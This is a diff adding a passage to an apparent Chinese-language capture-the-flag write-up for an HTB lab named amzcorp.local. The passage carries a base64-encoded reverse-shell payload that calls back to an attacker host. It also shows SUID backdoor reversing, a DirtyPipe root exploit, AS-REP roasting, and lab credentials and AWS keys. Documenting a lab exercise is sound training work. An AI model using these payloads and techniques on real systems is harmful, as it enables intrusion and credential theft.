@@ -1020,7 +1020,7 @@ for result in API_data.get("result", []):
 
 :::warning
 
-这里 `.result[].hostname` 中的Base64 编码存在padding 长度问题
+这里 `.result[].hostname` 中的 Base64 编码存在 padding 长度问题
 
 :::
 
@@ -1258,7 +1258,7 @@ print(res.text)
 
 :::note
 
-这里需要 Cookie 是 Managers 权限，而先前从 status API 中得到的凭据。正好是 Managers 权限，所以需要先使用 `tyler@amzcorp.local : {pXDWXyZ&>3h''W<` 凭据登录之后，使用其 Cookie 来与这个API交互
+这里需要 Cookie 是 Managers 权限，而先前从 status API 中得到的凭据，正好是 Managers 权限，所以需要先使用 `tyler@amzcorp.local : {pXDWXyZ&>3h''W<` 凭据登录之后，使用其 Cookie 来与这个API交互
 
 :::
 
@@ -2022,3 +2022,1331 @@ AWS{N0nc3_R3u5e_t0_s571_c0de_ex3cu71on}
 ```
 
 ## Magnified
+
+直接先来一手反弹 shell
+
+```plaintext
+http://company-support.amzcorp.local/admin/tickets/view/4?u=_&s=subclasses&i=init&g=globals&p=popen&r=read&c=echo cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE2LjY1Iiw5OTk5KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO2ltcG9ydCBwdHk7IHB0eS5zcGF3bigiYmFzaCIpJw== | base64 -d | bash -i
+```
+
+收到回连的 shell
+
+```shell
+(remote) www-data@eb929a545a5c:/var/www/web$ whoami
+www-data
+```
+
+低权限下，先枚举一下可用的提权路径
+
+```shell
+(remote) www-data@eb929a545a5c:/var/www/web$ find / -perm -u=s -type f 2>/dev/null
+/usr/bin/gpasswd
+/usr/bin/passwd
+/usr/bin/chsh
+/usr/bin/umount
+/usr/bin/chfn
+/usr/bin/mount
+/usr/bin/su
+/usr/bin/newgrp
+/usr/bin/backup_tool
+/usr/bin/sudo
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+```
+
+其中 `/usr/bin/backup_tool` 显得尤为可疑
+
+```shell
+(remote) www-data@eb929a545a5c:/var/www/web$ file /usr/bin/backup_tool
+/usr/bin/backup_tool: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=aa5bc5dcbf102646a15100cd46d31ac5754f5e6b, for GNU/Linux 3.2.0, not stripped
+
+(remote) www-data@eb929a545a5c:/var/www/web$ ls -laih /usr/bin/backup_tool
+1338388 -rwsr-xr-x 1 root root 25K Feb  9  2022 /usr/bin/backup_tool
+```
+
+既然有读取权限，将这个 ELF 下载到本地进行分析
+
+```c
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+    setgid(0);
+    setuid(0);
+    a(0);
+    return 0;
+}
+```
+
+对 `a` 函数跟进分析
+
+```c
+__int64 a()
+{
+    const char *v0; // rsi
+    __int64 v2; // [rsp+8h] [rbp-18h]
+    char *s2; // [rsp+18h] [rbp-8h]
+
+    puts("Enter your credentials to continue:");
+    printf("Username: ");
+    s2 = (char *)g_u();
+    __isoc99_scanf("%127s", username);
+    printf("Password: ");
+    __isoc99_scanf("%127s", password);
+    if ( strcmp(username, s2) )
+    {
+        puts("Incorrect Credentials!");
+        exit(1);
+    }
+    v0 = (const char *)g_p();
+    if ( strcmp(password, v0) )
+    {
+        puts("Incorrect Credentials!");
+        exit(1);
+    }
+    v2 = g_o();
+    printf("OTP: ");
+    __isoc99_scanf("%d8", &otp);
+    if ( v2 != otp )
+    {
+        puts("Incorrect Credentials!");
+        exit(1);
+    }
+    l_m();
+    return 0;
+}
+```
+
+人工粗略跟了一下，是一个带有身份校验 + TOTP 校验的后门程序，本质上是一个 Reverse 题目
+
+通过上面对身份的验证之后，进入下面的函数
+
+```c
+__int64 l_m()
+{
+  __int64 result; // rax
+  int v1; // [rsp+Ch] [rbp-4h] BYREF
+
+  do
+  {
+    puts("\nSelect Option:\n");
+    puts("1. Plant Backdoor");
+    puts("2. Read Secret");
+    puts("3. Restart exfiltration");
+    puts("4. Exit\n");
+    printf("Enter choice: ");
+    __isoc99_scanf("%1d", &v1);
+    if ( v1 == 4 )
+    {
+      printf("\x1B[1;1H\x1B[2J");
+      exit(0);
+    }
+    if ( v1 <= 4 )
+    {
+      switch ( v1 )
+      {
+        case 3:
+          s_b();
+          goto LABEL_12;
+        case 1:
+          a_b();
+          goto LABEL_12;
+        case 2:
+          r_s();
+          goto LABEL_12;
+      }
+    }
+    puts("Invalid choice!");
+LABEL_12:
+    result = (unsigned int)v1;
+  }
+  while ( v1 != 5 );
+  return result;
+}
+```
+
+可以启动 IDA 的 Linux Debugger 简单看一下程序，或者直接偷懒将 IDA 接入 LLM 进行分析
+
+使用 `Copilot + ida-pro-mcp + Claude Opus 4.6 Medium` 的分析结果，位于 [SUID ELF 逆向分析与利用](./suid-elf-analysis.md)
+
+首先先读取一下 Secret
+
+```shell
+(remote) www-data@eb929a545a5c:/var/www/web$ /usr/bin/backup_tool 
+Enter your credentials to continue:
+Username: backdoor
+Password: <!8,>;<;He
+OTP: 329606
+
+Select Option:
+
+1. Plant Backdoor
+2. Read Secret
+3. Restart exfiltration
+4. Exit
+
+Enter choice: 2
+Secret: AWS{r3v3r51ng_1mpl4nt5_1s_fun}
+```
+
+## flag - 05
+
+```plaintext title="Flag"
+AWS{r3v3r51ng_1mpl4nt5_1s_fun}
+```
+
+## Shortcut
+
+使用后门程序的 `Plant Backdoor` 功能，种一个后门
+
+```shell
+Select Option:
+
+1. Plant Backdoor
+2. Read Secret
+3. Restart exfiltration
+4. Exit
+
+Enter choice: 1
+Initiating backdoor...
+Already added to shadow
+```
+
+随后即可通过
+
+```shell
+(remote) www-data@eb929a545a5c:/var/www/web$ su tom
+Password: 
+(remote) tom@eb929a545a5c:/var/www/web$ whoami
+tom
+(remote) tom@eb929a545a5c:/var/www/web$ id
+uid=1000(tom) gid=1000(tom) groups=1000(tom)
+```
+
+获得普通用户的权限
+
+尝试了常规路径，，没有提权的路径，直接上 `PEASS-ng`
+
+```plaintext
+CVE: CVE-2021-27365 | Name: linux-iscsi | Match data: pkg=linux-kernel,ver<=5.11.3,CONFIG_SLAB_FREELIST_HARDENED!=y | Tags: RHEL=8 | Rank: 1 | Details: CONFIG_SLAB_FREELIST_HARDENED must not be enabled
+CVE: CVE-2021-3493 | Name: Ubuntu OverlayFS | Match data: pkg=linux-kernel,ver>=3.13,ver<5.14,x86_64 | Tags: ubuntu=(14.04|16.04|18.04|20.04|20.10) | Rank: 1 | Details: Only Ubuntu is affected.
+CVE: CVE-2021-22555 | Name: Netfilter heap out-of-bounds write | Match data: pkg=linux-kernel,ver>=2.6.19,ver<=5.12-rc6 | Tags: ubuntu=20.04{kernel:5.8.0-*} | Rank: 1 | Details: ip_tables kernel module must be loaded
+CVE: CVE-2022-0847 | Name: DirtyPipe | Match data: pkg=linux-kernel,ver>=5.8,ver<=5.16.11 | Tags: ubuntu=(20.04|21.04),debian=11 | Rank: 1
+CVE: CVE-2022-0995 | Name: watch_queue | Match data: pkg=linux-kernel,ver>=5.8,ver<5.16.5,x86_64 | Tags: ubuntu=21.10{kernel:5.13.0.37-generic} | Rank: 1 | Details: Not 100% reliable, may need to be run a couple of times. It rare cases it may panic the kernel.
+CVE: CVE-2022-32250 | Name: nft_object UAF (NFT_MSG_NEWSET) | Match data: pkg=linux-kernel,ver<5.18.1,CONFIG_USER_NS=y,sysctl:kernel.unprivileged_userns_clone==1 | Tags: ubuntu=(22.04){kernel:5.15.0-27-generic} | Rank: 1 | Details: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)
+```
+
+看样子内核版本还挺老，直接用 `DirtyPipe - CVE-2022-0847` 的 exp 直接打
+
+```shell
+(remote) tom@eb929a545a5c:/tmp$ ./exploit-static
+Backing up /etc/passwd to /tmp/passwd.bak ...
+Setting root password to "aaron"...It worked!
+Password: Restoring /etc/passwd from /tmp/passwd.bak...
+Done! Popping shell...
+(run commands now)
+whoami
+root
+
+ls -laih /root
+total 44K
+2259753 drwx------ 1 root root 4.0K Feb 17  2022 .
+ 807804 drwxr-xr-x 1 root root 4.0K Apr 10 13:04 ..
+2259754 drwxr-xr-x 1 root root 4.0K Feb 17  2022 .backup_tool
+1839037 -rw-r--r-- 1 root root 3.1K Dec  5  2019 .bashrc
+1207278 drwxr-xr-x 1 root root 4.0K Feb 16  2022 .cache
+1839038 -rw-r--r-- 1 root root  161 Dec  5  2019 .profile
+1207268 -rw-r--r-- 1 root root  173 Feb 17  2022 .wget-hsts
+1992600 -rw-r--r-- 1 root root   22 Feb 17  2022 flag.txt
+```
+
+## flag - 06
+
+```plaintext title="Flag"
+AWS{uN1x1f13d_4_l0t!}
+```
+
+## Jerry-built
+
+有了 `company-support.amzcorp.local` 的 root shell 之后，以 root 权限进行信息收集，看到了存在有邮件
+
+```shell title="cat /var/mail/root"
+From tom@localhost  Mon, 10 Jan 2022 09:10:48 GMT
+Return-Path: <tom@localhost>
+Received: from localhost (localhost [127.0.0.1])
+        by localhost (8.15.2/8.15.2/Debian-18) with ESMTP id 28AAfaX452455
+        for <root@localhost>; Mon, 10 Jan 2022 09:10:48 GMT
+Received: (from tom@localhost)
+        by localhost (8.15.2/8.15.2/Submit) id 28AAfaX452455;
+        Mon, 10 Jan 2022 09:10:48 GMT
+Date: Mon, 10 Jan 2022 09:10:48 GMT 
+Message-Id: <202201100910.28AAfaX452455@localhost>
+To: root@localhost
+From: tom@localhost
+Subject: Activating User Account
+
+Hi Tony.
+
+Could you please activate the user account jameshauwnnel on the domain controller along with setting correct permissions for him. 
+
+Thanks,
+Tom
+```
+
+知道目标用户之后，尝试进行枚举
+
+```shell
+┌──(randark㉿kali)-[~/tmp/HTB_AWS]
+└─$ nxc ldap 10.13.37.15
+LDAP        10.13.37.15     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:amzcorp.local)
+
+┌──(randark㉿kali)-[~/tmp/HTB_AWS]
+└─$ echo jameshauwnnel > users.txt
+
+┌──(randark㉿kali)-[~/tmp/HTB_AWS]
+└─$ ~/tools/kerbrute_linux_386 userenum --dc 10.13.37.15 -d amzcorp.local users.txt 
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: v1.0.3 (9dad6e1) - 04/11/26 - Ronnie Flathers @ropnop
+
+2026/04/11 21:17:43 >  Using KDC(s):
+2026/04/11 21:17:43 >   10.13.37.15:88
+
+2026/04/11 21:17:43 >  [+] VALID USERNAME:       jameshauwnnel@amzcorp.local
+2026/04/11 21:17:43 >  Done! Tested 1 usernames (1 valid) in 0.891 seconds
+```
+
+确认用户确实存在的情况下，先同步一下时间，避免出现握手失败
+
+```shell
+┌──(randark㉿kali)-[~/tmp/HTB_AWS]
+└─$ sudo ntpdate -s amzcorp.local
+```
+
+然后使用 Impacket 尝试 AS-REP Roasting
+
+```shell
+┌──(randark㉿kali)-[~/tmp/HTB_AWS]
+└─$ impacket-GetNPUsers amzcorp.local/ -no-pass -usersfile users.txt -format john -dc-ip 10.13.37.15
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+$krb5asrep$jameshauwnnel@AMZCORP.LOCAL:1860094bbb36c3c4ccb7f631f6f76b88$90e706d0f991c974549f09af8514605461de6e3d8f81819d9aa1173c32ef2149cd55435753730867a3b55866822e1eddc1aac4ce31569784b21137d66b475b81c1a5ce3b529bef1cfbe09fb985d83691b5560a451f9f2c29ea2fd10b8923320572e496f10e9a41d41a747b3117daff140d102bbb934289114729a5eceb5cbed908c842cc06acd3acbe6fe924e83f7eed85f6c4c6a84096be5c58e44bb7f2ab612d0151f04891ea0954ef506eb48f488f948e34139fe2a0a46869205e5a45fe78df3486f171bf5fd6a5c1195075a709ad1988ffaeac6b4fcb720758f594ad987927d77b13927fc25507f95b69d936
+```
+
+成功获取哈希之后，尝试进行破解，但是常见的字典文件中都没有爆破出来，虽然可以使用 `john` 来进行破解，但是也可以使用在线破解服务
+
+![img](img/image_20260435-213534.png)
+
+成功得到了用户密码
+
+```plaintext
+654221p!
+```
+
+对爆破的结果进行验证
+
+```shell
+┌──(randark㉿kali)-[~/tmp/HTB_AWS]
+└─$ nxc ldap 10.13.37.15 -u jameshauwnnel -p '654221p!'
+LDAP        10.13.37.15     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:amzcorp.local)
+LDAP        10.13.37.15     389    DC01             [+] amzcorp.local\jameshauwnnel:654221p! 
+```
+
+枚举一下常见的协议
+
+```shell
+┌──(randark㉿kali)-[~/tmp/HTB_AWS]
+└─$ nxc rdp 10.13.37.15 -u jameshauwnnel -p '654221p!'
+
+┌──(randark㉿kali)-[~/tmp/HTB_AWS]
+└─$ nxc wmi 10.13.37.15 -u jameshauwnnel -p '654221p!'
+RPC         10.13.37.15     135    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:amzcorp.local)
+RPC         10.13.37.15     135    DC01             [+] amzcorp.local\jameshauwnnel:654221p! 
+
+┌──(randark㉿kali)-[~/tmp/HTB_AWS]
+└─$ nxc smb 10.13.37.15 -u jameshauwnnel -p '654221p!'
+SMB         10.13.37.15     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:amzcorp.local) (signing:True) (SMBv1:False) 
+SMB         10.13.37.15     445    DC01             [+] amzcorp.local\jameshauwnnel:654221p! 
+```
+
+经过尝试，没办法通过 `wmix-exec` 来执行命令，只能通过 `smb` 尝试进行枚举
+
+使用 [aniqfakhrul/powerview.py: Powerview on steroids](https://github.com/aniqfakhrul/powerview.py) 进行连接
+
+```shell
+┌──(.venv)(randark㉿kali)-[~/tools/powerview.py]
+└─$ python3 powerview.py 'amzcorp.local/jameshauwnnel:654221p!@10.13.37.15' --web --web-host 0.0.0.0 --web-port 3000
+Logging directory is set to /home/randark/.powerview/logs/amzcorp
+[2026-04-11 21:48:56] Powerview web listening on 0.0.0.0:3000
+```
+
+![img](img/image_20260450-215005.png)
+
+连接上 DC 的 SMB 服务
+
+![img](img/image_20260454-215433.png)
+
+排除掉默认的 share 和没有权限的 `C$` 之外，有一个 `Product_Release` 的 share
+
+![img](img/image_20260455-215544.png)
+
+将两个文件下载到本地
+
+```html title="10.13.37.15_Product_Release_AMZ-V1.0.11.128_10.2.112_Release_Notes.html"
+<p><strong>Security Fixes:</strong></p>
+
+<ul>
+    <li>Fixes security vulnerabilities.</li>
+</ul>
+
+<p>For more information about security vulnerabilities, visit&nbsp;<a href="http://amzcorp.local/about/security">http://amzcorp.local/about/security</a></p>
+
+<p><strong>Download Link:&nbsp;</strong><u><a href="http://downloads.amzcorp.local/files/GDC/AMZv1/AMZ-V1.0.11.128_10.2.112.chk" target="_blank">http://downloads.amzcorp.local/files/GDC/AMZv1/AMZ-V1.0.11.128_10.2.112.chk</a></u></p>
+
+<p><strong>Firmware Update Instructions:</strong></p>
+
+<p>To update your device&rsquo;s firmware, follow the instructions in your device&rsquo;s user manual. To view your device&rsquo;s user manual, visit&nbsp;<a href="http://amzcorp.local/support/product/amzv1.aspx#docs">http://amzcorp.local/support/product/amzv1.aspx#docs</a>.</p>
+```
+
+根据 HTML 中的信息，可以得知这个 `.chk` 文件是 `AMZv1` 设备的固件文件
+
+对下载得到的 `10.13.37.15_Product_Release_AMZ-V1.0.11.128_10.2.112.chk` 文件，简跑一个 `binwalk`
+
+```shell
+┌──(randark㉿kali)-[~/tmp/HTB_AWS]
+└─$ binwalk 10.13.37.15_Product_Release_AMZ-V1.0.11.128_10.2.112.chk 
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Linux kernel ARM boot executable zImage (big-endian)
+14419         0x3853          xz compressed data
+14640         0x3930          xz compressed data
+538952        0x83948         Squashfs filesystem, little endian, version 4.0, compression:xz, size: 18230598 bytes, 995 inodes, blocksize: 262144 bytes, created: 2021-12-22 11:53:50
+```
+
+很好，很经典的 `Squashfs filesystem` 分区出现了，让 `binwalk` 全部解开来看看
+
+```shell
+┌──(randark㉿kali)-[~/tmp/HTB_AWS]
+└─$ binwalk -e 10.13.37.15_Product_Release_AMZ-V1.0.11.128_10.2.112.chk 
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+14419         0x3853          xz compressed data
+14640         0x3930          xz compressed data
+
+WARNING: Symlink points outside of the extraction directory: /home/randark/tmp/HTB_AWS/_10.13.37.15_Product_Release_AMZ-V1.0.11.128_10.2.112.chk.extracted/squashfs-root/var -> /tmp; changing link target to /dev/null for security purposes.
+
+WARNING: Symlink points outside of the extraction directory: /home/randark/tmp/HTB_AWS/_10.13.37.15_Product_Release_AMZ-V1.0.11.128_10.2.112.chk.extracted/squashfs-root/etc/localtime -> /tmp/localtime; changing link target to /dev/null for security purposes.
+
+WARNING: Symlink points outside of the extraction directory: /home/randark/tmp/HTB_AWS/_10.13.37.15_Product_Release_AMZ-V1.0.11.128_10.2.112.chk.extracted/squashfs-root/etc/TZ -> /tmp/TZ; changing link target to /dev/null for security purposes.
+
+WARNING: Symlink points outside of the extraction directory: /home/randark/tmp/HTB_AWS/_10.13.37.15_Product_Release_AMZ-V1.0.11.128_10.2.112.chk.extracted/squashfs-root/etc/resolv.conf -> /tmp/resolv.conf; changing link target to /dev/null for security purposes.
+
+WARNING: Symlink points outside of the extraction directory: /home/randark/tmp/HTB_AWS/_10.13.37.15_Product_Release_AMZ-V1.0.11.128_10.2.112.chk.extracted/squashfs-root/etc/mtab -> /proc/113910/mounts; changing link target to /dev/null for security purposes.
+
+WARNING: Symlink points outside of the extraction directory: /home/randark/tmp/HTB_AWS/_10.13.37.15_Product_Release_AMZ-V1.0.11.128_10.2.112.chk.extracted/squashfs-root/etc/ppp/resolv.conf -> /tmp/resolv.conf.ppp; changing link target to /dev/null for security purposes.
+
+WARNING: Symlink points outside of the extraction directory: /home/randark/tmp/HTB_AWS/_10.13.37.15_Product_Release_AMZ-V1.0.11.128_10.2.112.chk.extracted/squashfs-root-0/var -> /tmp; changing link target to /dev/null for security purposes.
+
+WARNING: Symlink points outside of the extraction directory: /home/randark/tmp/HTB_AWS/_10.13.37.15_Product_Release_AMZ-V1.0.11.128_10.2.112.chk.extracted/squashfs-root-0/etc/localtime -> /tmp/localtime; changing link target to /dev/null for security purposes.
+
+WARNING: Symlink points outside of the extraction directory: /home/randark/tmp/HTB_AWS/_10.13.37.15_Product_Release_AMZ-V1.0.11.128_10.2.112.chk.extracted/squashfs-root-0/etc/TZ -> /tmp/TZ; changing link target to /dev/null for security purposes.
+
+WARNING: Symlink points outside of the extraction directory: /home/randark/tmp/HTB_AWS/_10.13.37.15_Product_Release_AMZ-V1.0.11.128_10.2.112.chk.extracted/squashfs-root-0/etc/resolv.conf -> /tmp/resolv.conf; changing link target to /dev/null for security purposes.
+
+WARNING: Symlink points outside of the extraction directory: /home/randark/tmp/HTB_AWS/_10.13.37.15_Product_Release_AMZ-V1.0.11.128_10.2.112.chk.extracted/squashfs-root-0/etc/mtab -> /proc/113910/mounts; changing link target to /dev/null for security purposes.
+
+WARNING: Symlink points outside of the extraction directory: /home/randark/tmp/HTB_AWS/_10.13.37.15_Product_Release_AMZ-V1.0.11.128_10.2.112.chk.extracted/squashfs-root-0/etc/ppp/resolv.conf -> /tmp/resolv.conf.ppp; changing link target to /dev/null for security purposes.
+538952        0x83948         Squashfs filesystem, little endian, version 4.0, compression:xz, size: 18230598 bytes, 995 inodes, blocksize: 262144 bytes, created: 2021-12-22 11:53:50
+
+WARNING: One or more files failed to extract: either no utility was found or it's unimplemented
+```
+
+成功拆开了 `Squashfs filesystem` 分区
+
+![img](img/image_20260418-221800.png)
+
+在其中，并没有发现敏感的凭据，但是在 `/bin` 目录发现了一些固件自定义的程序 (非 Linux 自带程序) 例如 `/squashfs-root-0/bin/database`
+
+![img](img/image_20260423-222316.png)
+
+导入 IDA 进行分析后，发现了很多 `Pyinstaller` 的特征，可以确定是 `Pyinstaller` 打包的程序，使用 [extremecoders-re/pyinstxtractor: PyInstaller Extractor](github.com/extremecoders-re/pyinstxtractor) 拆开来进行分析
+
+```shell
+PS D:\Desktop> py -3.8 .\pyinstxtractor.py .\database
+[+] Processing .\database
+[+] Pyinstaller version: 2.1+
+[+] Python version: 3.8
+[+] Length of package: 16379452 bytes
+[+] Found 962 files in CArchive
+[+] Beginning extraction...please standby
+[+] Possible entry point: pyiboot01_bootstrap.pyc
+[+] Possible entry point: pyi_rth_pkgutil.pyc
+[+] Possible entry point: pyi_rth_multiprocessing.pyc
+[+] Possible entry point: pyi_rth_inspect.pyc
+[+] Possible entry point: dynamo.pyc
+[+] Found 490 files in PYZ archive
+[+] Successfully extracted pyinstaller archive: .\database
+
+You can now use a python decompiler on the pyc files within the extracted directory
+```
+
+查看提取的数据
+
+```shell
+PS D:\Desktop\database_extracted> Get-ChildItem
+
+    Directory: D:\Desktop\database_extracted
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d----           2026/4/11    22:28                boto3
+d----           2026/4/11    22:28                botocore
+d----           2026/4/11    22:28                certifi
+d----           2026/4/11    22:28                cryptography
+d----           2026/4/11    22:28                cryptography-2.8.egg-info
+d----           2026/4/11    22:28                lib-dynload
+d----           2026/4/11    22:28                PYZ-00.pyz_extracted
+-a---           2026/4/11    22:28         186288 _cffi_backend.cpython-38-x86_64-linux-gnu.so
+-a---           2026/4/11    22:28         778721 base_library.zip
+-a---           2026/4/11    22:28           1076 dynamo.pyc
+-a---           2026/4/11    22:28          74848 libbz2.so.1.0
+-a---           2026/4/11    22:28        2954080 libcrypto.so.1.1
+-a---           2026/4/11    22:28         182560 libexpat.so.1
+-a---           2026/4/11    22:28          43416 libffi.so.7
+-a---           2026/4/11    22:28         162264 liblzma.so.5
+-a---           2026/4/11    22:28         224008 libmpdec.so.2
+-a---           2026/4/11    22:28        5449112 libpython3.8.so.1.0
+-a---           2026/4/11    22:28         319528 libreadline.so.8
+-a---           2026/4/11    22:28         598104 libssl.so.1.1
+-a---           2026/4/11    22:28         192032 libtinfo.so.6
+-a---           2026/4/11    22:28          30936 libuuid.so.1
+-a---           2026/4/11    22:28         108936 libz.so.1
+-a---           2026/4/11    22:28            684 pyi_rth_inspect.pyc
+-a---           2026/4/11    22:28           2075 pyi_rth_multiprocessing.pyc
+-a---           2026/4/11    22:28           1069 pyi_rth_pkgutil.pyc
+-a---           2026/4/11    22:28           1388 pyiboot01_bootstrap.pyc
+-a---           2026/4/11    22:28           1728 pyimod01_os_path.pyc
+-a---           2026/4/11    22:28           8794 pyimod02_archive.pyc
+-a---           2026/4/11    22:28          17016 pyimod03_importers.pyc
+-a---           2026/4/11    22:28           3469 pyimod04_ctypes.pyc
+-a---           2026/4/11    22:28        2802008 PYZ-00.pyz
+-a---           2026/4/11    22:28            311 struct.pyc
+```
+
+根据 `Pyinstall` 解包的经验，程序主入口是 `dynamo.pyc` 文件，对其进行反编译
+
+```python
+import boto3
+dynamodb = boto3.client('dynamodb', 'http://cloud.amzcorp.local', 'AKIA5M37BDN6CD7IQDFP', 'HimNcdhuuNTYzG04Oiv9UhTfnCtKTFxDd8sO0Rue', **('endpoint_url', 'aws_access_key_id', 'aws_secret_access_key'))
+
+def Create(t):
+    table = dynamodb.create_table('t', [
+        {
+            'AttributeName': 'username',
+            'KeyType': 'HASH' },
+        {
+            'AttributeName': 'password',
+            'KeyType': 'RANGE' }], [
+        {
+            'AttributeName': 'username',
+            'AttributeType': 'S' },
+        {
+            'AttributeName': 'password',
+            'AttributeType': 'S' }], {
+        'ReadCapacityUnits': 10,
+        'WriteCapacityUnits': 10 }, **('Table', 'KeySchema', 'AttributeDefinitions', 'ProvisionedThroughput'))
+    return table
+
+
+def Delete(t):
+    table = dynamodb.Table(t)
+    table.delete()
+
+
+def Insert(t, i, j):
+    table = dynamodb.Table(t)
+    table.put_item({
+        'username': {
+            'S': i },
+        'password': {
+            'S': j } }, **('Item',))
+```
+
+在其中可以得到一份 AWS AKSK 凭据
+
+| Key                     | Value                                    |
+| :---------------------- | :--------------------------------------- |
+| `endpoint_url`          | `http://cloud.amzcorp.local`             |
+| `aws_access_key_id`     | AKIA5M37BDN6CD7IQDFP                     |
+| `aws_secret_access_key` | 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 |
+
+配置一下 `awscli` 的参数
+
+```shell
+┌──(randark㉿kali)-[~]
+└─$ aws configure
+AWS Access Key ID [None]: AKIA5M37BDN6CD7IQDFP
+AWS Secret Access Key [None]: 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
+Default region name [None]: us-east-1
+Default output format [None]: 
+```
+
+添加对应的 hosts 记录之后，尝试获取认证信息
+
+```shell
+┌──(randark㉿kali)-[~]
+└─$ aws --endpoint-url http://cloud.amzcorp.local sts get-caller-identity | jq
+{
+    "UserId": "AKIAC4G4H8J2K9K1L0M2",
+    "Account": "000000000000",
+    "Arn": "arn:aws:iam::000000000000:user/john"
+}
+```
+
+由于代码中是使用的 `dynamodb` 所以尝试获取数据库信息
+
+```shell
+┌──(randark㉿kali)-[~]
+└─$ aws --endpoint-url http://cloud.amzcorp.local dynamodb list-tables
+
+An error occurred (403) when calling the ListTables operation: User arn:aws:iam::000000000000:user/john is not authorized to perform this action
+```
+
+虽然没有权限枚举有哪些表，但是从先前的工单系统中，可以获取这份数据
+
+<details>
+
+<summary> `CF_Prod_Template.yml` </summary>
+
+```yml title="CF_Prod_Template.yml"
+AWSTemplateFormatVersion: 2010-09-09
+Resources:
+  LambdaFunction:
+    Type: 'AWS::Lambda::Function'
+    Properties:
+      Code:
+        ZipFile: |
+          import json
+          def lambda_handler(event, context):
+            try:
+              #ToDo
+      FunctionName: tracking_api
+      Handler: index.lambda_handler
+      Runtime: python3.9
+      Role: !GetAtt
+        - LambdaExecutionRole
+        - Arn
+    DependsOn:
+      - LambdaExecutionRole
+  LambdaExecutionRole:
+    Type: 'AWS::IAM::Role'
+    Properties:
+      RoleName: LambdaExecutionRole
+      Policies:
+        - PolicyName: LambdaPolicy
+          PolicyDocument:
+            Version: 2012-10-17
+            Statement:
+              - Action:
+                  - 'logs:CreateLogGroup'
+                  - 'logs:CreateLogStream'
+                  - 'logs:PutLogEvents'
+                Effect: Allow
+                Resource:
+                  - '*'
+      AssumeRolePolicyDocument:
+        Version: 2012-10-17
+        Statement:
+          - Action:
+              - 'sts:AssumeRole'
+            Effect: Allow
+            Principal:
+              Service:
+                - lambda.amazonaws.com
+  APIGatewayRestAPI:
+    Type: 'AWS::ApiGateway::RestApi'
+    Properties:
+      Name: tracking_api
+      EndpointConfiguration:
+        Types:
+          - REGIONAL
+    DependsOn:
+      - LambdaFunction
+  APIGatewayResource:
+    Type: 'AWS::ApiGateway::Resource'
+    Properties:
+      RestApiId: !Ref APIGatewayRestAPI
+      ParentId: !GetAtt
+        - APIGatewayRestAPI
+        - RootResourceId
+      PathPart: track
+    DependsOn:
+      - APIGatewayRestAPI
+  APIGatewayMethod:
+    Type: 'AWS::ApiGateway::Method'
+    Properties:
+      RestApiId: !Ref APIGatewayRestAPI
+      ResourceId: !Ref APIGatewayResource
+      HttpMethod: GET
+      AuthorizationType: AWS_IAM
+      MethodResponses:
+        - StatusCode: 200
+      Integration:
+        Type: AWS_PROXY
+        IntegrationResponses:
+          - StatusCode: 200
+        IntegrationHttpMethod: POST
+        Uri: !Sub
+          - >-
+            arn:aws:apigateway:us-east-2:lambda:path/2015-03-31/functions/${LambdaFuncNameArn}/invocations
+          - LambdaFuncNameArn: !GetAtt LambdaFunction.Arn
+    DependsOn:
+      - APIGatewayResource
+  APIGatewayDeployment:
+    Type: 'AWS::ApiGateway::Deployment'
+    Properties:
+      RestApiId: !Ref APIGatewayRestAPI
+      StageName: default
+    DependsOn:
+      - APIGatewayMethod
+  APIGatewayPermission:
+    Type: 'AWS::Lambda::Permission'
+    Properties:
+      Action: 'lambda:InvokeFunction'
+      FunctionName: !GetAtt LambdaFunction.Arn
+      Principal: apigateway.amazonaws.com
+    DependsOn:
+      - APIGatewayDeployment
+  DynamoDBTable:
+    Type: 'AWS::DynamoDB::Table'
+    Properties:
+      TableName: Users
+      AttributeDefinitions:
+        - AttributeName: username
+          AttributeType: S
+        - AttributeName: password
+          AttributeType: S
+      KeySchema:
+        - AttributeName: username
+          KeyType: HASH
+        - AttributeName: password
+          KeyType: RANGE
+      ProvisionedThroughput:
+        ReadCapacityUnits: '5'
+        WriteCapacityUnits: '5'
+  DynamoDBTable:
+    Type: 'AWS::DynamoDB::Table'
+    Properties:
+      TableName: Backup_Users
+      AttributeDefinitions:
+        - AttributeName: username
+          AttributeType: S
+        - AttributeName: password
+          AttributeType: S
+      KeySchema:
+        - AttributeName: username
+          KeyType: HASH
+        - AttributeName: password
+          KeyType: RANGE
+      ProvisionedThroughput:
+        ReadCapacityUnits: '5'
+        WriteCapacityUnits: '5'
+  JohnUser:
+    Type: 'AWS::IAM::User'
+    Properties:
+      UserName: john
+      Path: /
+      Policies:
+        - PolicyName: dynamodb-policy
+          PolicyDocument:
+            Version: 2012-10-17
+            Statement:
+              - Effect: Allow
+                Action:
+                  - 'dynamodb:Scan'
+                Resource: '*'
+  WillUser:
+    Type: 'AWS::IAM::User'
+    Properties:
+      UserName: will
+      Path: /
+      Policies:
